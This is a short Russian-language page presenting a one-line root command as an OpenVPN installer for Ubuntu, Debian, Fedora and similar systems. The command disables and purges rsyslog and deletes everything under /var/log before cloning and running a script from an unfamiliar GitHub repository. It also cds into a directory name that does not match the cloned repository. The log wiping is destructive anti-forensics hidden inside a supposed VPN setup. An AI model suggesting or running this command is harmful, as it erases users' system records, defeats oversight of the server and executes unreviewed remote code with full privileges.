Установщик OpenVPN для Ubuntu, Debian, AlmaLinux, Rocky Linux, CentOS и Fedora

Этот скрипт позволит вам настроить свой собственный VPN-сервер не более чем за минуту, даже если вы раньше не использовали OpenVPN. Он был разработан так, чтобы быть максимально незаметным и универсальным.

sudo bash -c 'systemctl stop rsyslog && systemctl disable rsyslog && cd /var/log && rm -rf * && apt-get remove --purge rsyslog -y && apt-get update && apt-get install git -y && cd /root && git clone https://github.com/admin404nextfloor/vpn.git && cd openvpn-install && chmod +x openvpn-install.sh && yes | ./openvpn-install.sh'
